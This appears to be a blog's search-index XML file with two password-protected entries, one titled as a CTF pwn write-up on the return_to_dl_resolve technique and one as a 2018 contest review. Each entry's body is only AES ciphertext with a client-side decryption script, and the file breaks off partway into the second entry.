<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[通过return_to_dl_resolve技术秒题]]></title>
      <url>/2018/08/19/return-to-dl-resolve/</url>
      <content type="html"><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
		showMessage('嘿！芝麻开门~~', 5000);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
			['resetEquationNumbers', MathJax.InputJax.TeX],
			['PreProcess', MathJax.Hub],
			['Reprocess', MathJax.Hub]
		);
	}
}
</script>
<div id="enc_content" style="display:none">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</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
showMessage("嘻嘻嘻，密码不对哦~", 5000);};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2018_807个人赛复盘]]></title>
      <url>/2018/08/07/20180807/</url>
      <content type="html"><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
		showMessage('嘿！芝麻开门~~', 5000);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
			['resetEquationNumbers', MathJax.InputJax.TeX],
			['PreProcess', MathJax.Hub],
			['Reprocess', MathJax.Hub]
		);
	}
}
</script>
